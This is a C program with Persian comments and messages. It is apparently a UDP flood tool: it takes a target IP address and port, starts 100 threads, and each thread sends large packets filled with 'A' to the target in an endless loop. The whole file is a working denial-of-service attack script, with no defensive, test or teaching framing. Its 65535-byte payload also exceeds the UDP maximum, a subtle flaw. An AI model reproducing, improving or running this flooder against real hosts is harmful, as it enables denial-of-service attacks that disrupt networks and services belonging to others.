#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>

#define BUFFER_SIZE 65535
#define THREAD_COUNT 100

void *send_udp_packets(void *arg) {
    char *target_ip = ((char **)arg)[0];
    int target_port = atoi(((char **)arg)[1]);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("خطا در ایجاد سوکت UDP");
        pthread_exit(NULL);
    }

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    char buffer[BUFFER_SIZE];
    memset(buffer, 'A', BUFFER_SIZE); // پر کردن داده با 'A'

    while (1) {
        if (sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("خطا در ارسال بسته");
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("استفاده: %s <آدرس IP مقصد> <پورت مقصد>\n", argv[0]);
        return 1;
    }

    pthread_t threads[THREAD_COUNT];
    char *args[2] = {argv[1], argv[2]}; // پارامترهای IP و پورت

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_udp_packets, args);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
